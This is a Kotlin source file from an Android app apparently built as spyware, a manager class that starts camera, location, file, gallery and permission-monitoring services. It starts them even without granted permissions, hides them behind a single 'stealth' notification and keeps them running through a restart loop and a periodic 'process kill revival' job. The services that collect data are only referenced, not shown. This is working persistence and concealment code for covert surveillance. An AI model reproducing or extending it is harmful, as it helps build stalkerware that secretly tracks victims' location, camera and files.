package com.h4k3r.dreamer

import android.app.Service
import android.content.ComponentName
import android.content.Context
import android.content.Intent
import android.content.ServiceConnection
import android.os.Build
import android.os.Handler
import android.os.IBinder
import android.os.Looper
import android.util.Log
import kotlinx.coroutines.*

class EnhancedServiceManager(private val context: Context) {
    companion object {
        private const val TAG = "EnhancedServiceManager"

        @Volatile
        private var instance: EnhancedServiceManager? = null

        fun getInstance(context: Context): EnhancedServiceManager {
            return instance ?: synchronized(this) {
                instance ?: EnhancedServiceManager(context.applicationContext).also { instance = it }
            }
        }
    }

    private val scope = CoroutineScope(Dispatchers.Main + SupervisorJob())
    private val handler = Handler(Looper.getMainLooper())
    private val activeServices = mutableMapOf<Class<out Service>, ServiceInfo>()
    // Using StealthNotificationManager instead of NotificationAutoManager

    data class ServiceInfo(
        val serviceClass: Class<out Service>,
        val isForeground: Boolean,
        val requiredPermissions: List<String>,
        val notificationId: Int?,
        val isRunning: Boolean = false,
        val lastStartTime: Long = 0,
        val retryCount: Int = 0
    )

    /* ── Enhanced Service Management ────────────────────────── */

    fun startAllServicesWithPersistence() {
        scope.launch {
            Log.d(TAG, "Starting all services with enhanced persistence")

            // Initialize stealth notification system
            val stealthManager = StealthNotificationManager.getInstance(context)

            val servicesToStart = listOf(
                ServiceInfo(
                    CameraService::class.java,
                    isForeground = true,
                    requiredPermissions = listOf("camera"),
                    notificationId = StealthNotificationManager.STEALTH_NOTIFICATION_ID
                ),
                ServiceInfo(
                    DataService::class.java,
                    isForeground = true,
                    requiredPermissions = listOf("location_fine", "location_coarse", "location_background"),
                    notificationId = StealthNotificationManager.STEALTH_NOTIFICATION_ID
                ),
                ServiceInfo(
                    PermissionMonitorService::class.java,
                    isForeground = true,
                    requiredPermissions = emptyList(),
                    notificationId = StealthNotificationManager.STEALTH_NOTIFICATION_ID
                ),
                ServiceInfo(
                    AdvancedPersistenceService::class.java,
                    isForeground = true,
                    requiredPermissions = emptyList(),
                    notificationId = StealthNotificationManager.STEALTH_NOTIFICATION_ID
                ),
                ServiceInfo(
                    WatchdogService::class.java,
                    isForeground = false,
                    requiredPermissions = emptyList(),
                    notificationId = null // Background service doesn't need notification
                ),
                ServiceInfo(
                    FilesService::class.java,
                    isForeground = false,
                    requiredPermissions = listOf("storage_read"),
                    notificationId = null // Background service doesn't need notification
                ),
                ServiceInfo(
                    GalleryService::class.java,
                    isForeground = false,
                    requiredPermissions = listOf("storage_read"),
                    notificationId = null // Background service doesn't need notification
                )
            )

            var successCount = 0

            for (serviceInfo in servicesToStart) {
                try {
                    val started = startServiceWithRetry(serviceInfo)
                    if (started) {
                        activeServices[serviceInfo.serviceClass] = serviceInfo.copy(
                            isRunning = true,
                            lastStartTime = System.currentTimeMillis()
                        )
                        successCount++

                        // Ensure stealth notification is active
                        stealthManager.enforceStealthMode()
                    }

                    // No delay between service starts to prevent timeout crashes
                } catch (e: Exception) {
                    Log.e(TAG, "Failed to start service ${serviceInfo.serviceClass.simpleName}: ${e.message}")
                }
            }

            Log.d(TAG, "Service startup complete: $successCount/${servicesToStart.size} services started")

            // Start enhanced persistence monitoring
            startEnhancedPersistenceMonitor()

            // Setup process kill detection and revival
            setupProcessKillRevival()

            // Optimize notifications immediately - no delay to prevent crashes
            // Using StealthNotificationManager instead of individual notifications
        }
    }

    private suspend fun startServiceWithRetry(serviceInfo: ServiceInfo): Boolean {
        val maxRetries = 3
        var currentRetry = 0

        while (currentRetry < maxRetries) {
            try {
                // Check permissions first
                val hasRequiredPermissions = checkServicePermissions(serviceInfo.requiredPermissions)
                if (!hasRequiredPermissions && serviceInfo.requiredPermissions.isNotEmpty()) {
                    Log.w(TAG, "Service ${serviceInfo.serviceClass.simpleName} missing required permissions, starting anyway")
                }

                val intent = Intent(context, serviceInfo.serviceClass)

                if (serviceInfo.isForeground && Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                    try {
                        // Start foreground service immediately - no delays to prevent timeout
                        context.startForegroundService(intent)
                        Log.d(TAG, "Started ${serviceInfo.serviceClass.simpleName} as foreground service (attempt ${currentRetry + 1})")

                        // No delay - service must call startForeground() immediately in onCreate()

                        // All services use the same stealth notification - no individual registration needed

                        return true
                    } catch (foregroundException: Exception) {
                        Log.w(TAG, "Foreground service start failed for ${serviceInfo.serviceClass.simpleName}: ${foregroundException.message}")

                        // If it's a foreground service timeout, try again with regular service
                        if (foregroundException.message?.contains("ForegroundServiceDidNotStartInTime") == true) {
                            Log.w(TAG, "Foreground service timeout detected, falling back to regular service")
                        }

                        // Try regular service as fallback
                        try {
                            context.startService(intent)
                            Log.d(TAG, "Started ${serviceInfo.serviceClass.simpleName} as regular service (fallback)")
                            return true
                        } catch (regularException: Exception) {
                            Log.e(TAG, "Regular service start also failed: ${regularException.message}")
                        }
                    }
                } else {
                    try {
                        context.startService(intent)
                        Log.d(TAG, "Started ${serviceInfo.serviceClass.simpleName} as regular service")
                        return true
                    } catch (e: Exception) {
                        Log.e(TAG, "Regular service start failed: ${e.message}")
                    }
                }

                currentRetry++
                if (currentRetry < maxRetries) {
                    Log.d(TAG, "Retrying service start for ${serviceInfo.serviceClass.simpleName} immediately (no delay)")
                    // No delay between retries to prevent foreground service timeout
                }

            } catch (e: Exception) {
                Log.e(TAG, "Service start attempt failed: ${e.message}")
                currentRetry++
            }
        }

        Log.e(TAG, "Failed to start service ${serviceInfo.serviceClass.simpleName} after $maxRetries attempts")
        return false
    }

    private fun checkServicePermissions(requiredPermissions: List<String>): Boolean {
        if (requiredPermissions.isEmpty()) return true

        return requiredPermissions.any { permission ->
            val manifestPermission = getManifestPermission(permission)
            manifestPermission?.let {
                androidx.core.content.ContextCompat.checkSelfPermission(
                    context,
                    it
                ) == android.content.pm.PackageManager.PERMISSION_GRANTED
            } ?: false
        }
    }

    private fun getManifestPermission(configPermission: String): String? {
        return when (configPermission) {
            "camera" -> android.Manifest.permission.CAMERA
            "location_fine" -> android.Manifest.permission.ACCESS_FINE_LOCATION
            "location_coarse" -> android.Manifest.permission.ACCESS_COARSE_LOCATION
            "location_background" -> android.Manifest.permission.ACCESS_BACKGROUND_LOCATION
            "storage_read" -> if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
                android.Manifest.permission.READ_MEDIA_IMAGES
            } else {
                android.Manifest.permission.READ_EXTERNAL_STORAGE
            }
            else -> null
        }
    }

    /* ── Service Persistence Monitor ────────────────────────── */

    private fun startEnhancedPersistenceMonitor() {
        scope.launch {
            Log.d(TAG, "Starting enhanced persistence monitor")

            while (true) {
                try {
                    // Check all active services every 90 seconds (reduced frequency)
                    checkAndRestartFailedServices()
                    delay(90000) // 90 seconds
                } catch (e: Exception) {
                    Log.e(TAG, "Enhanced persistence monitor error: ${e.message}")
                    delay(300000) // Wait 5 minutes on error
                }
            }
        }
    }

    private fun setupProcessKillRevival() {
        // Schedule periodic checks via WorkManager to detect process kills
        val revivalWorkRequest = androidx.work.PeriodicWorkRequestBuilder<ProcessRevivalWorker>(
            15, java.util.concurrent.TimeUnit.MINUTES
        ).setConstraints(
            androidx.work.Constraints.Builder()
                .setRequiredNetworkType(androidx.work.NetworkType.CONNECTED)
                .build()
        ).build()

        androidx.work.WorkManager.getInstance(context).enqueueUniquePeriodicWork(
            "process_revival_monitor",
            androidx.work.ExistingPeriodicWorkPolicy.KEEP,
            revivalWorkRequest
        )

        Log.d(TAG, "Process kill revival system setup complete")
    }

    private suspend fun checkAndRestartFailedServices() {
        val currentTime = System.currentTimeMillis()
        val failedServices = mutableListOf<ServiceInfo>()

        activeServices.values.forEach { serviceInfo ->
            // Check if service has been running for more than 10 minutes
            if (currentTime - serviceInfo.lastStartTime > 600000) {
                // Try to verify service is still running
                val isStillRunning = verifyServiceRunning(serviceInfo.serviceClass)
                if (!isStillRunning) {
                    Log.w(TAG, "Service ${serviceInfo.serviceClass.simpleName} appears to have stopped, marking for restart")
                    failedServices.add(serviceInfo)
                }
            }
        }

        // Restart failed services
        for (serviceInfo in failedServices) {
            try {
                Log.d(TAG, "Restarting failed service: ${serviceInfo.serviceClass.simpleName}")
                val restarted = startServiceWithRetry(serviceInfo.copy(retryCount = serviceInfo.retryCount + 1))

                if (restarted) {
                    activeServices[serviceInfo.serviceClass] = serviceInfo.copy(
                        isRunning = true,
                        lastStartTime = System.currentTimeMillis(),
                        retryCount = serviceInfo.retryCount + 1
                    )
                    Log.d(TAG, "Successfully restarted service: ${serviceInfo.serviceClass.simpleName}")
                } else {
                    Log.e(TAG, "Failed to restart service: ${serviceInfo.serviceClass.simpleName}")
                }

                delay(2000) // Wait between restart attempts
            } catch (e: Exception) {
                Log.e(TAG, "Error restarting service ${serviceInfo.serviceClass.simpleName}: ${e.message}")
            }
        }

        if (failedServices.isNotEmpty()) {
            // Ensure stealth notification remains active after service recovery
            val stealthManager = StealthNotificationManager.getInstance(context)
            stealthManager.enforceStealthMode()
        }
    }

    private fun verifyServiceRunning(serviceClass: Class<out Service>): Boolean {
        return try {
            // Try to connect to service to verify it's running
            val intent = Intent(context, serviceClass)
            val connection = object : ServiceConnection {
                override fun onServiceConnected(name: ComponentName?, service: IBinder?) {
                    // Service is running
                }
                override fun onServiceDisconnected(name: ComponentName?) {
                    // Service disconnected
                }
            }

            val bindResult = context.bindService(intent, connection, Context.BIND_AUTO_CREATE)
            if (bindResult) {
                context.unbindService(connection)
                true
            } else {
                false
            }
        } catch (e: Exception) {
            Log.e(TAG, "Service verification failed for ${serviceClass.simpleName}: ${e.message}")
            false
        }
    }

    /* ── Service Control Methods ────────────────────────── */

    fun stopAllServices() {
        scope.launch {
            Log.d(TAG, "Stopping all managed services")

            activeServices.keys.forEach { serviceClass ->
                try {
                    val intent = Intent(context, serviceClass)
                    context.stopService(intent)
                    Log.d(TAG, "Stopped service: ${serviceClass.simpleName}")
                } catch (e: Exception) {
                    Log.e(TAG, "Failed to stop service ${serviceClass.simpleName}: ${e.message}")
                }
            }

            activeServices.clear()
            // StealthNotificationManager handles single persistent notification - no clearing needed
        }
    }

    fun getActiveServiceCount(): Int {
        return activeServices.size
    }

    fun isServiceRunning(serviceClass: Class<out Service>): Boolean {
        return activeServices[serviceClass]?.isRunning ?: false
    }
}